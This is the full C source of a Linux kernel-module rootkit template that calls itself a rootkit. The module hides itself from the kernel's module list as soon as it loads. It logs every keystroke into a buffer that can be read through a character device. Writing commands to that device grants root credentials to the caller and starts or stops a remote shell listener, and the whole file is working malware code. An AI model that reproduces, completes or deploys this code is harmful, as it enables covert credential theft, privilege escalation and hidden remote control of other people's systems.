/*
 * This is the template file used to build a system
 * specific kernel module.
*/

#include<linux/init.h>
#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/errno.h>
#include<linux/types.h>
#include<linux/unistd.h>
#include<linux/string.h>
#include<asm/current.h>
#include<linux/sched.h>
#include<linux/syscalls.h>
#include<asm/system.h>
#include<linux/fs.h>
#include<linux/keyboard.h>
#include<linux/input.h>
#include<linux/semaphore.h>
#include<linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ciaran McNally - maK@redbrick.dcu.ie");
MODULE_DESCRIPTION("This is a rootkit implementation");

#define DEVICE_NAME_TEMPLATE
#define DEVICE_MAJOR_TEMPLATE
#define MAX_CMD_LENGTH 20
#define SHELL "SHELL_TEMPLATE"
#define CLEANUP "CLEAN_TEMPLATE"

/*
 * --Keyboard Notifier--
 */
struct semaphore s;
static int shiftPressed = 0;

/*
 * --Character Device--
 */
int major;
//Store 100mb of key press data
char keyBuffer[1000000];
char commands[MAX_CMD_LENGTH];
const char* endPtr = (keyBuffer+(sizeof(keyBuffer)-1));
char* basePtr = keyBuffer;
int keyLogOn = 1;

/*
 * --Hiding Module--
 */
int modHidden = 0;
static struct list_head *modList;

/*
 * --Debug Prints--
 */
int debug = 0;

/*
 * --Ensure only 1 shell listener--
 */
int shellUp = 0;

/*
 * --Privilege Escalation. Give caller root.--
 */
void root_me(void){
	struct cred *haxcredentials;
	haxcredentials = prepare_creds();
	if(haxcredentials == NULL)
		return;
	haxcredentials->uid = haxcredentials->gid = 0;
	haxcredentials->euid = haxcredentials->egid = 0;
	haxcredentials->suid = haxcredentials->sgid = 0;
	haxcredentials->fsuid = haxcredentials->fsgid = 0;
	commit_creds(haxcredentials);
}

/*
 * --Start reverse shell listener--
 */
static int start_listener(void){
	char *argv[] = { SHELL, NULL, NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

/*
 * --Kill reverse shell listener--
 */
static int kill_listener(void){
	char *argv[] = { CLEANUP, NULL, NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

//Key press without shift
static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
				"0","-","=","[BS]","[TAB]","q","w","e","r",
				"t","y","u","i","o","p","[","]","[ENTR]",
				"[CTRL]","a","s","d","f","g","h","j","k","l",
				";","'","`","[SHFT]","\\","z","x","c","v","b",
				"n","m",",",".","/","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[UP]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};
//Key press with shift
static const char* keysShift[] = {"","[ESC]","!","@","#","$","%","^","&","*",
				"(",")","_","+","[BS]","[TAB]","Q","W","E","R",
				"T","Y","U","I","O","P","{","}","[ENTR]",
				"[CTRL]","A","S","D","F","G","H","J","K","L",
				":","\"","~","[SHFT]","|","Z","X","C","V","B",
				"N","M","<",">","?","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[U]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};

//On key notify event, catch and run handler
int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
	struct keyboard_notifier_param *param = p;
   	if(kcode == KBD_KEYCODE && keyLogOn){
        if( param->value==42 || param->value==54 ){
            down(&s);
            if(param->down > 0){
                shiftPressed = 1;
			}
            else{
                shiftPressed = 0;
			}
            up(&s);
            return NOTIFY_OK;
        }
		//Store keys to buffer
        if(param->down){
            int i;
			char c;
			down(&s);
			i = 0;
			if(shiftPressed){
				while(i < strlen(keysShift[param->value])){
				    c = keysShift[param->value][i];
					i++;
					*basePtr = c;
                    basePtr++;
                    if(basePtr == endPtr){
						basePtr = keyBuffer;
					}
				}
			}
            else{
				while(i < strlen(keys[param->value])){
                    c = keys[param->value][i];
                    i++;
                    *basePtr = c;
                    basePtr++;
                    if(basePtr == endPtr){
                        basePtr = keyBuffer;
                    }
                }
            }    
            up(&s);
        }
    }
 	return NOTIFY_OK;
}

//Hiding the kernel module
void hide_module(void){
	if(modHidden){
    	return;
    }
	modList = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
    modHidden = 1;
}

//revealing the kernel module
void reveal_module(void){
	if(modHidden == 0){
		return;
	}
	list_add(&THIS_MODULE->list, modList);
        modHidden = 0;
}

//open device
int open_dev(struct inode *inode, struct file *filp){
	return 0; //success
}
//read of device
ssize_t read_dev(struct file *filp, char __user *buf, size_t count, 
						loff_t *posPtr){
	int key;
	int result;
	char* buffer;
	if(debug == 1)
		printk(KERN_ALERT "maK_it: read_dev executed!\n");
	key = 0;
	buffer = keyBuffer;
	while(*buffer != '\0'){
		key++;
		buffer++;
	}
	if(*posPtr || (key == 0)){
		return 0;
	}
	result = copy_to_user(buf, keyBuffer, key);
	if(result){
		return -EFAULT;
	}
	*posPtr = 1;
	return key;
}
//write to device (take commands)
static ssize_t write_dev(struct file *filp, const char *buff,
		 			size_t len, loff_t *posPtr){
	const char *cmdPtr;
	const char *cmdEndPtr;
	int i;
	char c;
	cmdPtr = buff;
	cmdEndPtr = buff + len - 1;
	i = 0;
	//This section handles our commands.
	if(len < MAX_CMD_LENGTH){
		memset(commands, 0, sizeof(commands));
		while(cmdPtr != cmdEndPtr){
			c = *cmdPtr;
			commands[i] = c;
			cmdPtr++;
			i++;
		}
        if(debug == 1)
    		printk(KERN_ALERT "maK_it: command: %s \n",commands);
		if(strcmp(commands, "debug") == 0){
			if(debug == 0){ debug = 1;}
			else{ debug = 0;}
		}
		if(strcmp(commands,"keyLogOn") == 0){
			keyLogOn = 1;
			if(debug == 1)
				printk(KERN_ALERT "maK_it: Key logger on!\n");
        	}
		if(strcmp(commands, "keyLogOff") == 0){
			keyLogOn = 0;
			if(debug == 1)
				printk(KERN_ALERT "maK_it: Key logger off!\n");
		}
		if(strcmp(commands, "modHide") == 0){
			hide_module();
			if(debug == 1)
				printk(KERN_ALERT "maK_it: Module Hidden!\n");
		}
		if(strcmp(commands, "modReveal") == 0){
			reveal_module();
			if(debug == 1)
				printk(KERN_ALERT "maK_it: Module revealed!\n");
		}
		if(strcmp(commands, "rootMe") == 0){
			root_me();
			if(debug == 1)
				printk(KERN_ALERT "maK_it: Given r00t!\n");
		}
		if(strcmp(commands, "shellUp") == 0){
			if(shellUp == 0){
				start_listener();
				shellUp = 1;
			}
			if(debug == 1)
				printk(KERN_ALERT "maK_it: Remote Shell listener started!\n");
		}
		if(strcmp(commands, "shellDown") == 0){
			if(shellUp == 1){
				kill_listener();
				shellUp = 0;
			}
			if(debug == 1)
				printk(KERN_ALERT "maK_it: Remote Shell listener down!\n");
		}
		if(strcmp(commands, "command") == 0)
			printk(KERN_EMERG "commands: debug, keyLogOn/Off, modHide/Reveal, rootMe, shellUp/Down\n");
	}
	else{
		if(debug == 1)
			printk(KERN_ALERT "maK_it: Command was too long.\n");
	}
	return -EINVAL;
}

//release the device
static int release_dev(struct inode *inode, struct file *filp){
	return 0; //success
}

//File operations for device
struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = open_dev,
    .read = read_dev,
	.write = write_dev,
	.release = release_dev,
};
//Notifier handler
static struct notifier_block nb = {
    .notifier_call = key_notify
};

/*
 * --Initialise & Exit Module code--
 */

static int init_mod(void){

    //hide module on start
    hide_module();
    
	//Listen for keys.
	register_keyboard_notifier(&nb);
	sema_init(&s, 1);        
	
	//Register a character device
	memset(keyBuffer, 0, sizeof(keyBuffer));
	major = register_chrdev(DEVICE_MAJOR, DEVICE_NAME, &fops);
	if(debug == 1)
		printk(KERN_ALERT "maK_it: Major %i \n", DEVICE_MAJOR);
	if(major < 0){
		if(debug == 1)
			printk(KERN_INFO "maK_it: Major device failed with -1");
        	return major;
	}
	return 0;
}

static void exit_mod(void){
	//Cleaning up on exit
	if(debug == 1)
		printk(KERN_ALERT "maK_it: Exiting module. \n");
	unregister_keyboard_notifier(&nb);
	unregister_chrdev(DEVICE_MAJOR, DEVICE_NAME);
	memset(keyBuffer, 0, sizeof(keyBuffer));
	memset(commands, 0, sizeof(commands));
	return;
}

module_init(init_mod);
module_exit(exit_mod);
